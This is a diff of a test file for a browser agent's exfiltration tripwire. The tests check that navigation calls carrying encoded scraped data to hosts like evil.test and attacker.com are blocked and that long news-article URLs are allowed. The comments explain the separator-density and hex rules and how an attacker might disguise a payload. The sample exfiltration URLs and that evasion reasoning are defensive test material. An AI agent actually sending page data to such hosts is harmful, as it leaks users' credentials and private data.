@@ -101,18 +101,48 @@ describe('inspectTabToolCall — blocks the exfil shape in a low-FP slot', () =>
     expect(v.action).toBe('block');
   });
 
-  // ACCEPTED-COST false block, pinned honestly: a ≥100-char SINGLE path segment
-  // trips the wire whether it is an opaque token OR a readable slug — readability
-  // does not exempt a run (English ~4.0 bits > the 3.5 gate), only its length and
-  // the `/` boundaries do. Real slugs cluster at 70–95 chars and pass; this
-  // 102-char one does not. Documented in the header as the path accepted cost.
-  test('a >=100-char single readable path segment blocks (documented accepted cost)', () => {
-    const v = inspectTabToolCall({
-      name: 'navigate',
-      args: { url: 'https://blog.example.com/the-complete-guide-to-building-modern-web-applications-with-react-typescript-and-graphql-in-production' },
-      currentOrigin: 'https://github.com',
-    });
-    expect(v.action).toBe('block');
+  // WAS an "accepted cost", and should not have been. This test used to assert
+  // that a ≥100-char readable slug BLOCKS, on the reasoning that "real slugs
+  // cluster at 70–95 chars and pass". Adversarial review falsified that against
+  // live URLs — Guardian, TechCrunch and LinkedIn permalinks all exceed 100 —
+  // so the accepted cost was in fact "peerd refuses to read news articles",
+  // which is the most ordinary thing a browser agent does and exactly the
+  // failure that gets a security feature switched off.
+  //
+  // Prose is now recognized by SHAPE (separator density) rather than exempted
+  // by length. See looksLikeProse for why entropy cannot make this call.
+  test('a long readable article slug is NOT an exfil payload', () => {
+    for (const url of [
+      'https://blog.example.com/the-complete-guide-to-building-modern-web-applications-with-react-typescript-and-graphql-in-production',
+      'https://www.theguardian.com/world/2026/jul/12/scientists-say-the-newly-discovered-species-of-deep-sea-jellyfish-could-change-how-we-think-about-evolution',
+      'https://techcrunch.com/2026/07/12/openai-and-anthropic-announce-a-joint-safety-framework-for-browser-based-agents-in-consumer-products/',
+    ]) {
+      expect(inspectTabToolCall({ name: 'navigate', args: { url }, currentOrigin: 'https://github.com' }).action)
+        .toBe('allow');
+    }
+  });
+
+  test('…but a slug-SHAPED payload does not get a free pass', () => {
+    // The exemption is separator DENSITY, so an attacker must actually spend
+    // ~8% of the payload on separators to hide behind it. A raw blob, and a blob
+    // with a token sprinkling of hyphens, both still block.
+    const raw = 'YWxpY2VAZXhhbXBsZS5jb21zZWNyZXR0b2tlbnNrbGl2ZTRlQzM5SHFMeWpXRGFyakxjYXJkNDI0MjQyNDI0MjQyNDI0MmV4cDEyMjc';
+    expect(inspectTabToolCall({ name: 'navigate', args: { url: `https://evil.test/${raw}` }, currentOrigin: 'https://mail.google.com' }).action)
+      .toBe('block');
+    const sparse = `${raw.slice(0, 50)}-${raw.slice(50)}`;   // ~1% separators
+    expect(inspectTabToolCall({ name: 'navigate', args: { url: `https://evil.test/${sparse}` }, currentOrigin: 'https://mail.google.com' }).action)
+      .toBe('block');
+  });
+
+  test('a long HEX run is a payload even though it has no separators and low entropy', () => {
+    // Hex is the one encoded form that is both separator-free and BELOW prose on
+    // entropy (~3.95 vs ~4.1), so the density test alone would have let it
+    // through. Nothing a person writes is a hundred unbroken hex digits.
+    const hex = 'a3f19c0e5b7d2846109fbe37cd5a41082e6b9f4d7c130a58e2b6d94f0173ac85'
+      + 'be29d641f0c73a9e58b2d146f0937ea50c8b31d7";'.replace(/[^0-9a-f]/g, '')
+      + 'f4a92c7e0b613d8a5f207c94e1b6d38047ca9152';
+    expect(inspectTabToolCall({ name: 'navigate', args: { url: `https://evil.test/${hex}` }, currentOrigin: 'https://mail.google.com' }).action)
+      .toBe('block');
   });
 
   test('type: a typed value that IS an exfil URL (blob in path)', () => {
@@ -372,13 +402,29 @@ describe('inspectTabToolCall — allows legitimate navigation (false-positive av
     expect(inspectTabToolCall('nope').action).toBe('allow');
   });
 
-  test('off-origin path blob with NO current origin is allowed (nothing scraped yet)', () => {
+  test('NO current origin means UNKNOWN, not innocent — the blob still blocks', () => {
+    // This used to assert `allow`, on the reasoning that "exfil presupposes a
+    // page already read, which always leaves a currentOrigin behind". False in
+    // this codebase: the chat's web actor is minted with ZERO tabs and reads
+    // pages with fetch_url, which needs no tab — so ctx.activeTab is undefined
+    // in exactly the state where the actor HAS just scraped a page. The old
+    // branch made the tripwire inert on the actor's primary read path.
     const v = inspectTabToolCall({
       name: 'navigate',
       args: { url: `https://attacker.com/${SCRAPED_BLOB}` },
       currentOrigin: undefined,
     });
-    expect(v.action).toBe('allow');
+    expect(v.action).toBe('block');
+  });
+
+  test('with no current origin an ORDINARY navigation is still allowed', () => {
+    // Falling through costs nothing: a block still needs a payload shape, so a
+    // first navigation from a tabless start is unaffected.
+    expect(inspectTabToolCall({
+      name: 'navigate',
+      args: { url: 'https://example.com/docs/getting-started' },
+      currentOrigin: undefined,
+    }).action).toBe('allow');
   });
 
   test('non-http(s) schemes are ignored (no cross-origin GET exfil)', () => {
